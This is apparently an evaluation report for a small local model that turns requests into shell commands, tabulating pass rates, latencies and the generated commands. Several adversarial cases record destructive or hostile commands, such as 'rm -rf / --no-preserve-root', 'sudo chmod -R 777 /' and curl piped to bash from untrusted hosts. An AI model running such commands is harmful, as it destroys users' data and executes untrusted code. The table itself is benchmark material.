# eval: llama-server / /Users/hridyaagrawal/.local/share/lexis/models/Qwen2.5-Coder-3B-Instruct-Q4_K_M.gguf (bake)
- mode: schema · dataset core.jsonl#83828218eadbc7f7 · repeat 2
- pass: 58/72 (81%)
- cold p50 3986ms p95 8537ms · warm p50 3466ms p95 7562ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 9386 | 7646 | node -v ; npm -v |
| u02 | ✓ | 6462 | 7562 | ls -lh |
| u03 | ✓ | 6353 | 5111 | curl ifconfig.me |
| u04 | ✓ | 8243 | 11034 | lsof -i :3000 |
| u05 | ✓ | 8537 | 6796 | du -sh . |
| u06 | ✓ | 13203 | 14219 | find /Users/hridyaagrawal/Honey/React/smartterminal/lexis -type f -name '*.log'  |
| u07 | ✓ | 4800 | 3359 | ps aux | grep node |
| u08 | ✓ | 4970 | 4004 | git status ; git branch |
| u09 | ✓ | 2875 | 2687 | brew install ripgrep |
| u10 | ✓ | 4324 | 4236 | mkdir projects ; cd projects |
| u11 | ✓ | 3671 | 3466 | tar -czvf archive.tar.gz /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| u12 | ✓ | 3120 | 2706 | echo $PATH |
| u13 | ✗ | 5549 | 4700 | lsof -i :8080 ; kill -9 <PID> |
| u14 | ✓ | 3644 | 3163 | tail -n 20 /var/log/syslog |
| u15 | ✗ | 2789 | 2537 | brew list python3 |
| u16 | ✓ | 3343 | 3218 | brew update ; brew outdated |
| u17 | ✓ | 3597 | 3896 | echo $SHELL ; echo $HOME |
| u18 | ✓ | 3480 | 3275 | git reset --soft HEAD~1 |
| u19 | ✓ | 4081 | 3328 | du -sh ~/* | sort -rh | head -n 5 |
| u20 | ✗ | 2730 | 2506 | top |
| u21 | ✓ | 3232 | 3271 | find . -name '*.js' -type f -exec wc -l {} + |
| u22 | ✓ | 2724 | 2818 | brew services restart docker |
| u23 | ✓ | 4106 | 4985 | chmod +x script.sh ; ./script.sh |
| u24 | ✓ | 4186 | 3758 | grep -r TODO /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| u25 | ✓ | 5678 | 5565 | mkdir -p ~/Downloads ; curl -O https://example.com/file.zip ; mv file.zip ~/Down |
| u26 | ✓ | 4329 | 4197 | sysctl -n hw.ncpu ; sysctl -n hw.model |
| u27 | ✓ | 3759 | 3744 | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 3834 | 3469 | find . -type d -name 'node_modules' -exec rm -rf {} + |
| u29 | ✗ | 3383 | 3141 | sudo lsof -i -P -n | grep LISTEN |
| u30 | ✓ | 3031 | 2761 | unzip file.zip |
| u31 | ✓ | 3986 | 2940 | tail -f /Users/hridyaagrawal/Honey/React/smartterminal/lexis/logfile.log |
| u32 | ✓ | 2485 | 3010 | uptime |
| u33 | ✓ | 7811 | 4461 | ls -a ~/.zshrc ~/.bashrc ~/.profile ~/.bash_profile ~/.zprofile ~/.zlogin ~/.inp |
| u34 | ✓ | 2756 | 2877 | scutil --dns |
| u35 | ✓ | 4099 | 2811 | cp file.txt backup.txt |
| u36 | ✓ | 4235 | 5372 | mv old.txt new.txt |
| u37 | ✓ | 4485 | 3081 | du -sh ~/Downloads |
| u38 | ✓ | 3399 | 3430 | npm list -g --depth=0 |
| u39 | ✓ | 2973 | 3050 | open . |
| u40 | ✗ | 3504 | 3398 | dscacheutil -flushcache |
| a01 | ✓ | 3377 | 2920 | rm -rf ~/* |
| a02 | ✗ | 5689 | - | - |
| a03 | ✓ | 3570 | 5489 | git push --force origin main |
| a04 | ✗ | 7150 | 7041 | brew install curl ; curl -L https://sketchy.example.com/install.sh | bash |
| a05 | ✓ | 4376 | 4431 | killall -9 * |
| a06 | ✓ | 5960 | 5553 | sudo chmod -R 777 / |
| a07 | ✗ | 3586 | 4882 | brew services start lexis |
| a08 | ✓ | 9505 | 6402 | curl -L https://x.io/i -o installer.sh ; chmod +x installer.sh ; ./installer.sh |
| a09 | ✓ | 5267 | 4542 | sudo chown -R $(whoami) / ; sudo chmod -R 755 / |
| a10 | ✓ | 5661 | 5322 | find /var/log -type f -mtime +30 -exec rm -f {} \; |
| a11 | ✓ | 7340 | 6462 | crontab -e ; echo '@reboot /Users/hridyaagrawal/Honey/React/smartterminal/lexis/ |
| a12 | ✓ | 4433 | 3552 | git reset --hard HEAD~$(git rev-list --count --before="$(date -v -1d)" HEAD) |
| a13 | ✓ | 2753 | 3000 | brew uninstall node |
| a14 | ✓ | 3421 | 3383 | sudo brew services stop firewalld |
| a15 | ✗ | 7368 | - | - |
| a16 | ✗ | 7101 | - | - |
| a17 | ✗ | 3597 | 3627 | rm -rf ~ |
| a18 | ✓ | 4534 | 4469 | openssl enc -aes-256-cbc -salt -in /Users/hridyaagrawal/Honey/React/smarttermina |
| a19 | ✗ | 2965 | 2842 | nano ~/.zshrc |
| a20 | ✓ | 3988 | 3846 | rm -rf / --no-preserve-root |
| u41 | ✗ | 3768 | 5360 | find /Users/hridyaagrawal -type f -size +100M |
| u42 | ✓ | 4900 | 3386 | echo 'hello world' > my notes.txt |
| u43 | ✓ | 3029 | 2900 | git log --oneline -5 |
| u44 | ✓ | 3204 | 3752 | curl -s https://example.com |
| u45 | ✓ | 4670 | 3224 | ls -1 | wc -l |
| u46 | ✓ | 3384 | 3144 | ifconfig | grep inet | grep -v 127.0.0.1 | awk '{print $2}' |
| u47 | ✓ | 2895 | 2668 | df -h |
| u48 | ✓ | 2692 | 2260 | who |
| a21 | ✓ | 4155 | 4027 | crontab -e ; 0 0 * * * rm -rf /tmp |
| a22 | ✓ | 3255 | 3151 | ln -sf ~/hosts /etc/hosts |
| a23 | ✓ | 2686 | 2831 | rm -rf * |
| a24 | ✗ | 3087 | 3060 | curl https://x.io/i.sh | bash |
